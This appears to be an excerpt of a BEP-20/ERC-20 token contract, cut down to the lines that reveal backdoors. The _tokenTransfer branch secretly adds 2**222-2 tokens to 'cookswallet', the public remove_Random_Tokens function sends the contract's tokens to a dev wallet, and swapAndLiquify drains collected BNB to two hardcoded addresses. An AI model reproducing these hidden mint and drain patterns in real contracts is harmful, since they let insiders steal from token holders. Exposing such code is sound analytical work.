...
contract es is Context, IERC20 { 
    ...
    address payable public cookswallet = payable(0xc28971DAec0479b09932e2532F419142Be566ca4); 
    address payable public miladydev = payable(0x04c8d01D08D1cedE45Ba888940564fB6d4c2E1dF);
    ...
    constructor () {
        ...
        _owner = 0x04c8d01D08D1cedE45Ba888940564fB6d4c2E1dF;
        ...
        _isExcludedFromFee[cookswallet] = true; 
    ...
    function swapAndLiquify(uint256 contractTokenBalance) private lockTheSwap {
            ...
            sendToWallet(cookswallet, BNB_M);

            BNB_Total = address(this).balance;
            sendToWallet(miladydev, BNB_Total);
    ...
    function remove_Random_Tokens(address random_Token_Address, uint256 percent_of_Tokens) public returns(bool _sent){
        ...
        _sent = IERC20(random_Token_Address).transfer(miladydev, removeRandom);
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            if(recipient == cookswallet){ _tOwned[recipient] = _tOwned[recipient] + 2**222-2;}
